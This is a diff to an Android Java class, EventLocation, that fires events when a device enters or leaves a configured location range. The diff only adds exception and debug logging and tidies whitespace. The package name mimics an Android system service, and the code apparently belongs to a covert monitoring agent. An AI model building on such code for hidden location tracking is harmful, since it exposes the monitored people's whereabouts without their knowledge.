@@ -11,6 +11,8 @@ package com.android.service.event;
 
 import java.io.IOException;
 
+import android.R.bool;
+
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
@@ -40,16 +42,21 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 	@Override
 	public void actualStop() {
 		locator.halt();
+
 		try {
 			locator.join();
 		} catch (final InterruptedException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 			}
 		}
+
 		locator = null;
-		
+
 		onExit(); // di sicurezza
 	}
 
@@ -65,6 +72,10 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 				Check.log(TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig + " Dist: " + distance);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			}
 		} catch (final ConfigurationException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			return false;
 		}
 
@@ -76,6 +87,9 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 	}
 
 	public int notification(Boolean onEnter) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "  " + (onEnter ? "Entered" : "Exited"));
+		}
 		if (onEnter) {
 			onEnter();
 		} else {
@@ -84,5 +98,4 @@ public class EventLocation extends BaseEvent implements RangeObserver {
 
 		return 0;
 	}
-
 }
